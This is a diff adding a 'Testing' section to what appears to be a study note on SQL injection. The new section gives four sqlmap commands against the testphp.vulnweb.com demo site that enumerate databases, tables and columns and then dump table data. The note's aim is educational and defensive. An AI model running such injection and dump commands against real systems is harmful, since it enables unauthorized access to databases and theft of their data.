@@ -23,6 +23,36 @@ Causes:
 - if input is not but validated the query interrupted
 - can be tricked into running arbitrary SQL queries or commands
 
+### Testing
+
+Using [`sqlmap`](https://sqlmap.org/) a penetration testing tool that automates the process of detecting and exploiting SQL injection flaws
+
+_Example:_ Vulnerable URL: `http://testphp.vulnweb.com/listproducts.php?cat=1`
+
+1. List information about the existing databases
+
+   ```bash
+   sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs
+   ```
+
+2. List information about Tables present in a particular Database
+
+   ```bash
+   sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --tables
+   ```
+
+3. List information about the columns of a particular table
+
+   ```bash
+   sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T artists --columns
+   ```
+
+4. Dump the data from the columns
+
+   ```bash
+   sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T artists -C aname --dump
+   ```
+
 ### Mitigation
 
 - Reject untrusted / invalid input data
